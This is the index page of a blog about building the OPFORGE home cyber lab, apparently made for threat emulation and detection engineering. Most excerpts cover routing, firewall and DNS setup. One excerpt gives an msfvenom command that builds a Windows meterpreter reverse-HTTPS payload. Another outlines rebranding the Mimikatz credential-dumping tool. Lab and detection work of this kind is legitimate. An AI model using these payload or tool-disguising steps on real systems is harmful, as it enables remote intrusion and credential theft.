<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>OPFORGE Posts | OPFORGE</title>
<meta name=keywords content><meta name=description content="OPFORGE Posts - OPFORGE"><meta name=author content="Alfredo Pelaez"><link rel=canonical href=https://opforge.dev/posts/><link crossorigin=anonymous href=/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF+13Dyqob6ASlTrTye8=" rel="preload stylesheet" as=style><link rel=icon href=https://opforge.dev/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://opforge.dev/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://opforge.dev/favicon-32x32.png><link rel=apple-touch-icon href=https://opforge.dev/apple-touch-icon.png><link rel=mask-icon href=https://opforge.dev/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://opforge.dev/posts/index.xml><link rel=alternate hreflang=en href=https://opforge.dev/posts/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://opforge.dev/posts/"><meta property="og:site_name" content="OPFORGE"><meta property="og:title" content="OPFORGE Posts"><meta property="og:description" content="Detection Engineering and Threat Emulation Lab"><meta property="og:locale" content="en-us"><meta property="og:type" content="website"><meta property="og:image" content="https://opforge.dev/preview.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://opforge.dev/preview.png"><meta name=twitter:title content="OPFORGE Posts"><meta name=twitter:description content="Detection Engineering and Threat Emulation Lab"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"OPFORGE Posts","item":"https://opforge.dev/posts/"}]}</script></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://opforge.dev/ accesskey=h title="OPFORGE (Alt + H)">OPFORGE</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://opforge.dev/ title=Home><span>Home</span></a></li><li><a href=https://opforge.dev/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://opforge.dev/posts/ title=Posts><span class=active>Posts</span></a></li><li><a href=https://opforge.dev/about/ title=About><span>About</span></a></li><li><a href=https://opforge.dev/docs/ title="OPFORGE Docs"><span>OPFORGE Docs</span></a></li></ul></nav></header><main class=main><header class=page-header><h1>OPFORGE Posts</h1></header><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>OPFORGE Post 4: Routing from REDÂ NET to DMZ Confirmed</h2></header><div class=entry-content><p>âœ… Objective Ensure full routed communication path from opf-rt-red (192.168.10.1) to opf-fw-dmz (pfSense, 192.168.21.2) through:
opf-rt-red â†’ opf-rt-inet â†’ opf-rt-ext â†’ opf-fw-dmz ğŸ§­ Summary of Actions Since Post #3 ğŸ”§ Interface Corrections Verified that opf-rt-ext eth1 had correct IP 192.168.21.1/24 Corrected VMnet assignment for opf-rt-ext and opf-fw-dmz to share same virtual switch (e.g., VMnet3) Validated Layer 2 reachability using arp -an and ping ğŸ“¦ Routing Configuration On opf-rt-red: Static route to 192.168.22.0/24 via 192.168.10.2 On opf-rt-inet: Routes to 192.168.21.0/24 and 192.168.22.0/24 via 192.168.22.2 On opf-rt-ext: Forwarded DMZ-bound traffic to 192.168.21.2 On opf-fw-dmz: Static route to 192.168.10.0/24 via 192.168.21.1 Added to /etc/rc.conf.local for persistence ğŸ” Firewall Configuration pfSense WAN interface rule added: Allow ICMP from any to any on WAN Confirmed ICMP echo replies work from opf-rt-red ğŸ§ª Test Results ping 192.168.21.2 from opf-rt-red: âœ… Success Traceroute confirmed routed path through opf-rt-inet and opf-rt-ext ARP and ICMP traffic verified using tcpdump and manual ARP queries ğŸ“˜ Lessons Captured Lesson Description ğŸ”Œ VMnet Isolation Misaligned virtual NICs caused unreachable ARP/NIC comms â€” VM topology must be tightly controlled ğŸ” Static Routing Discipline Each router must explicitly know how to reach at least one hop forward and one hop back ğŸ§± pfSense Default Behavior ICMP and interzone traffic blocked unless explicitly allowed â€” must add rules even for internal sim zones ğŸ”„ Route Persistence For pfSense, /etc/rc.conf.local controls static route persistence (not /etc/rc.conf directly) ğŸ“¦ Artifacts Captured opf-fw-dmz route config: /etc/rc.conf.local opf-rt-* route configs: CLI command history + saved config tree Screenshot archive: ICMP and routing confirmation ğŸ“Œ Coming Next In Post #5, weâ€™ll break down the OPFORGE project using PMP principles:
...</p></div><footer class=entry-footer><span title='2025-06-17 00:00:00 +0000 UTC'>June 17, 2025</span>&nbsp;Â·&nbsp;2 min&nbsp;Â·&nbsp;Alfredo Pelaez</footer><a class=entry-link aria-label="post link to OPFORGE Post 4: Routing from REDÂ NET to DMZ Confirmed" href=https://opforge.dev/posts/opforge_post_4_red_to_dmz./></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Defining the Battlefield: Segmentation Planning Begins</h2></header><div class=entry-content><p>â€œA secure architecture begins with deliberate separation of trust.â€
ğŸ§­ Overview Now that RED_NET has outbound access through a routed chain, weâ€™re ready to define the next phase of the OPFORGE battlefield: network segmentation.
In this post, we document our initial IP planning and interface mapping across the four planned security zones: RED (offensive ops), EXT (external untrusted), DMZ (controlled exposure), and INT (internal services and endpoints).
This step lays the architectural groundwork for detection surface placement, access control enforcement, and future emulation scenarios.
...</p></div><footer class=entry-footer><span title='2025-06-16 00:00:00 +0000 UTC'>June 16, 2025</span>&nbsp;Â·&nbsp;3 min&nbsp;Â·&nbsp;Alfredo Pelaez</footer><a class=entry-link aria-label="post link to Defining the Battlefield: Segmentation Planning Begins" href=https://opforge.dev/posts/opforge_post_3_segmentation/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>First Route, First Blood: Standing Up REDÂ NET</h2></header><div class=entry-content><p>â€œBefore you can emulate an adversary, you must be able to reach the battlefield.â€
ğŸ§­ Overview In Post #1, we covered the initial design philosophy behind OPFORGE and the high-level segmentation plan. Now itâ€™s time to get traffic moving. In this post, we focus on building and validating the first complete routing path from RED_NET to the public internet.
This milestone enables offensive tooling on opf-red01 and opf-lnx01 to begin live-fire interaction with the outside world in a controlled and observable way. The setup also establishes our first artifact set: routed VyOS configs, packet captures, and validation logs.
...</p></div><footer class=entry-footer><span title='2025-06-16 00:00:00 +0000 UTC'>June 16, 2025</span>&nbsp;Â·&nbsp;2 min&nbsp;Â·&nbsp;Alfredo Pelaez</footer><a class=entry-link aria-label="post link to First Route, First Blood: Standing Up REDÂ NET" href=https://opforge.dev/posts/opforge_post_2_routing/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>OPFORGE Genesis: Designing a Full-Spectrum Cyber Lab</h2></header><div class=entry-content><p>â€œBefore we wage war in cyberspace, we must first build the battlefield.â€
ğŸ§­ Overview Welcome to the first post of the OPFORGE blog series. This series walks through the step-by-step development of OPFORGE: a purpose-built, full-spectrum cyber operations lab environment designed to showcase and implement real-world capabilities tied to professional certifications, advanced education, and operational experience.
In this foundational post, we focus on Phase 1: the initial lab topology and routing architecture. This layer sets the stage for future red vs blue scenarios, AI-driven detection, and system-level investigations.
...</p></div><footer class=entry-footer><span title='2025-06-16 00:00:00 +0000 UTC'>June 16, 2025</span>&nbsp;Â·&nbsp;2 min&nbsp;Â·&nbsp;Alfredo Pelaez</footer><a class=entry-link aria-label="post link to OPFORGE Genesis: Designing a Full-Spectrum Cyber Lab" href=https://opforge.dev/posts/opforge_post_1_genesis/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>OPFORGE Network Internet Access Setup Guide</h2></header><div class=entry-content><p>OPFORGE Network Internet Access Setup Guide This guide outlines the configuration steps used to enable full internet access from the Red Network within the OPFORGE lab environment. It includes configuration of VyOS routers opf-rtred and opf-rt-inet, as well as ensuring connectivity from a host such as opf-lnx01.
ğŸ”§ 1. opf-rt-inet Configuration (Internet Gateway) Interfaces eth0: 192.168.10.2/24 (RED_NET) eth1: 192.168.1.25/24 (WAN - External/Internet-facing) Commands configure # Set interface IPs (if not set) set interfaces ethernet eth0 address 192.168.10.2/24 set interfaces ethernet eth1 address 192.168.1.25/24 # Default route to WAN gateway set protocols static route 0.0.0.0/0 next-hop 192.168.1.1 # Enable NAT for RED_NET to WAN set nat source rule 100 outbound-interface eth1 set nat source rule 100 source address 192.168.10.0/24 set nat source rule 100 translation address masquerade # Enable DNS forwarding set service dns forwarding listen-address 192.168.10.2 set service dns forwarding allow-from 192.168.10.0/24 set service dns forwarding name-server 1.1.1.1 set service dns forwarding name-server 8.8.8.8 commit save exit ğŸ”§ 2. opf-rtred Configuration (Red Network Router) Interfaces eth0: 192.168.10.1/24 (RED_NET) Commands configure # Set static default route to forward traffic to opf-rt-inet set protocols static route 0.0.0.0/0 next-hop 192.168.10.2 # Set DNS resolver to point to opf-rt-inet set system name-server 192.168.10.2 commit save exit ğŸ§ª 3. opf-lnx01 or Red Network Host Ensure the following are configured on your RED_NET endpoints:
...</p></div><footer class=entry-footer><span title='2025-06-12 00:00:00 +0000 UTC'>June 12, 2025</span>&nbsp;Â·&nbsp;2 min&nbsp;Â·&nbsp;Alfredo Pelaez</footer><a class=entry-link aria-label="post link to OPFORGE Network Internet Access Setup Guide" href=https://opforge.dev/posts/opforge-internet-setup/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>OPFORGE Rebrand Checklist for Mimikatz</h2></header><div class=entry-content><p>OPFORGE Rebrand Checklist for Mimikatz This step-by-step guide simplifies the process of rebranding Mimikatz under the OPFORGE project. Use it to create a portfolio-grade build aligned with Threat Emulation, Detection Engineering, and Explainable AI objectives.
Maintainer: Alfredo Pelaez
Date: 2025-05-31
Project Alignment: OPFORGE | High-Yield Performance & Results (H.Y.P.R.) Mindset
âœ… Phase 1: Clone and Prepare the Repo Clone the Mimikatz repository:
git clone --recursive https://github.com/gentilkiwi/mimikatz.git Tools/mimikatz Create a backup copy:
...</p></div><footer class=entry-footer><span title='2025-05-31 00:00:00 +0000 UTC'>May 31, 2025</span>&nbsp;Â·&nbsp;2 min&nbsp;Â·&nbsp;Alfredo Pelaez</footer><a class=entry-link aria-label="post link to OPFORGE Rebrand Checklist for Mimikatz" href=https://opforge.dev/posts/2025-05-31-opforge_rebrand_checklist/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Correcting OPF-DC01 Placement in ADINFRA Segment</h2></header><div class=entry-content><p>Background Originally, OPF-DC01 was deployed with an IP address in the CSOCINFRA (192.168.20.0/24) subnet. However, per OPFORGEâ€™s logical segmentation, all domain services must reside in the ADINFRA (192.168.40.0/24) segment to maintain operational and architectural integrity.
Problem OPF-DC01 had IP 192.168.20.100 (incorrect subnet). The gateway was misconfigured as 192.168.50.5 (C2 CONTROL). This broke domain service accessibility and violated the subnetâ€™s trust boundary. Solution 1. Re-IP OPF-DC01 to ADINFRA New-NetIPAddress -InterfaceAlias "Ethernet0" ` -IPAddress "192.168.40.100" ` -PrefixLength 24 ` -DefaultGateway "192.168.40.5" 2. Update DNS Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses "192.168.40.100" 3. Fix Default Route Remove-NetRoute -InterfaceAlias "Ethernet0" -NextHop 192.168.50.5 New-NetRoute -InterfaceAlias "Ethernet0" ` -DestinationPrefix "0.0.0.0/0" ` -NextHop "192.168.40.5" Results OPF-DC01 now properly resides at 192.168.40.100. Routing flows through opf-fw01 via gateway 192.168.40.5. It is ready to serve domain joins from endpoints like OPF-MBR01.</p></div><footer class=entry-footer><span title='2025-05-27 00:00:00 +0000 UTC'>May 27, 2025</span>&nbsp;Â·&nbsp;1 min&nbsp;Â·&nbsp;Alfredo Pelaez</footer><a class=entry-link aria-label="post link to Correcting OPF-DC01 Placement in ADINFRA Segment" href=https://opforge.dev/posts/2025-05-27-opf-dc01-corrective-ip-alignment/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Fixing DNS Resolution in OPFORGE: Domain Forwarding via pfSense</h2></header><div class=entry-content><p>ğŸ§© Problem Summary After placing OPF-DC01 into the ADINFRA subnet (192.168.40.0/24), OPF-MBR01 was unable to resolve public domains such as google.com. DNS requests to 192.168.40.100 (the DC) failed to resolve, even though routing to the firewall was functional.
ğŸ” Root Cause By default, OPF-DC01 was not forwarding DNS queries to a working upstream resolver. Attempted use of public DNS forwarders like 8.8.8.8 and 1.1.1.1 failed because OPF-DC01 had no internet access in the segmented lab setup.
...</p></div><footer class=entry-footer><span title='2025-05-27 00:00:00 +0000 UTC'>May 27, 2025</span>&nbsp;Â·&nbsp;2 min&nbsp;Â·&nbsp;Alfredo Pelaez</footer><a class=entry-link aria-label="post link to Fixing DNS Resolution in OPFORGE: Domain Forwarding via pfSense" href=https://opforge.dev/posts/2025-05-27-opf-dns-forwarding-infrastructure-fix/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Installing Sysinternals Suite Offline in OPFORGE</h2></header><div class=entry-content><p>ğŸ¯ Purpose In the OPFORGE lab, Chocolatey may not be reliable due to segmented DNS or network control. Hereâ€™s how to install the full Sysinternals Suite offline to a standard lab path.
ğŸ—‚ï¸ Installation Directory All tools are installed to:
C:\OPFORGE\Tools\Sysinternals This ensures consistent, reproducible builds and clean environment variables.
ğŸ› ï¸ Installation Steps 1. Download From a system with internet access:
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile "SysinternalsSuite.zip" 2. Transfer and Install Copy the zip to C:\OPFORGE\SysinternalsSuite.zip, then run:
...</p></div><footer class=entry-footer><span title='2025-05-27 00:00:00 +0000 UTC'>May 27, 2025</span>&nbsp;Â·&nbsp;1 min&nbsp;Â·&nbsp;Alfredo Pelaez</footer><a class=entry-link aria-label="post link to Installing Sysinternals Suite Offline in OPFORGE" href=https://opforge.dev/posts/2025-05-27-opf-sysinternals-offline-install/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>OPF-RED01 Metasploit Setup & Payload Generation</h2></header><div class=entry-content><p>Metasploit Installed Metasploit was installed using the official msfinstall script:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall chmod 755 msfinstall sudo ./msfinstall Confirmed with:
msfconsole --version Payload Generation The following payload was created for C2 operations within the DMZRED segment:
sudo msfvenom -p windows/x64/meterpreter/reverse_https \ LHOST=192.168.22.50 LPORT=8443 \ -f exe -o shell.exe Payload was moved to:
/opt/opforge/redteam/payloads/shell.exe File properties:
file shell.exe sha256sum shell.exe The payload is now ready to be staged from OPF-RED01 or delivered via social engineering as part of a detection validation scenario.
...</p></div><footer class=entry-footer><span title='2025-05-26 00:00:00 +0000 UTC'>May 26, 2025</span>&nbsp;Â·&nbsp;1 min&nbsp;Â·&nbsp;Alfredo Pelaez</footer><a class=entry-link aria-label="post link to OPF-RED01 Metasploit Setup & Payload Generation" href=https://opforge.dev/posts/2025-05-26-opf-red01-metasploit-setup/></a></article><footer class=page-footer><nav class=pagination><a class=next href=https://opforge.dev/posts/page/2/>Next&nbsp;&nbsp;Â»</a></nav></footer></main><footer class=footer><span>&copy; 2025 <a href=https://opforge.dev/>OPFORGE</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>